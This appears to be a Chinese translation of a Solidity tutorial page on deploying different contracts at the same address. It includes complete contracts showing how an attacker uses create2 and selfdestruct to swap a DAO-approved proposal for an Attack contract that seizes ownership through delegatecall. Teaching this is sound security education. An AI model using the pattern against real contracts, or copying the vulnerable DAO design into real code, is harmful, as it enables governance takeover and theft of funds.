@@ -1,0 +1,135 @@
+# 在同一地址部署不同合约
+
+对应英文原页：https://solidity-by-example.org/hacks/deploy-different-contracts-same-address
+
+使用 `create` 部署的合约地址按如下方式计算。
+
+```
+contract address = last 20 bytes of sha3(rlp_encode(sender, nonce))
+```
+
+其中 `sender` 是部署者的地址，`nonce` 是 `sender` 发送的交易数量。
+
+因此，如果我们能以某种方式重置 `nonce`，就有可能在同一地址部署不同的合约。
+
+下面是一个 DAO 如何被攻击的例子。
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+/*
+由 Alice 调用
+0. 部署 DAO
+
+由攻击者调用
+1. 部署 DeployerDeployer
+2. 调用 DeployerDeployer.deploy()
+3. 调用 Deployer.deployProposal()
+
+由 Alice 调用
+4. 让 DAO 批准 Proposal
+
+由攻击者调用
+5. 删除 Proposal 和 Deployer
+6. 重新部署 Deployer
+7. 调用 Deployer.deployAttack()
+8. 调用 DAO.execute
+9. 检查 DAO.owner 是否为攻击者地址
+
+DAO -- 已批准 --> Proposal
+DeployerDeployer -- create2 --> Deployer -- create --> Proposal
+DeployerDeployer -- create2 --> Deployer -- create --> Attack
+*/
+
+contract DAO {
+    struct Proposal {
+        address target;
+        bool approved;
+        bool executed;
+    }
+
+    address public owner = msg.sender;
+    Proposal[] public proposals;
+
+    function approve(address target) external {
+        require(msg.sender == owner, "not authorized");
+
+        proposals.push(
+            Proposal({target: target, approved: true, executed: false})
+        );
+    }
+
+    function execute(uint256 proposalId) external payable {
+        Proposal storage proposal = proposals[proposalId];
+        require(proposal.approved, "not approved");
+        require(!proposal.executed, "executed");
+
+        proposal.executed = true;
+
+        (bool ok,) = proposal.target.delegatecall(
+            abi.encodeWithSignature("executeProposal()")
+        );
+        require(ok, "delegatecall failed");
+    }
+}
+
+contract Proposal {
+    event Log(string message);
+
+    function executeProposal() external {
+        emit Log("Executed code approved by DAO");
+    }
+
+    function emergencyStop() external {
+        selfdestruct(payable(address(0)));
+    }
+}
+
+contract Attack {
+    event Log(string message);
+
+    address public owner;
+
+    function executeProposal() external {
+        emit Log("Executed code not approved by DAO :)");
+        // 例如 - 把 DAO 的 owner 设为攻击者
+        owner = msg.sender;
+    }
+}
+
+contract DeployerDeployer {
+    event Log(address addr);
+
+    function deploy() external {
+        bytes32 salt = keccak256(abi.encode(uint256(123)));
+        address addr = address(new Deployer{salt: salt}());
+        emit Log(addr);
+    }
+}
+
+contract Deployer {
+    event Log(address addr);
+
+    function deployProposal() external {
+        address addr = address(new Proposal());
+        emit Log(addr);
+    }
+
+    function deployAttack() external {
+        address addr = address(new Attack());
+        emit Log(addr);
+    }
+
+    function kill() external {
+        selfdestruct(payable(address(0)));
+    }
+}
+```
+
+---
+## 关注我们
+[Yanbo的Twitter](https://x.com/Yanbo2004)｜[Web3Club的Twitter](https://twitter.com/Web3ClubCN)
+
+
+[加入我们](https://github.com/Web3-Club/Intro./blob/main/Join%20club.md)
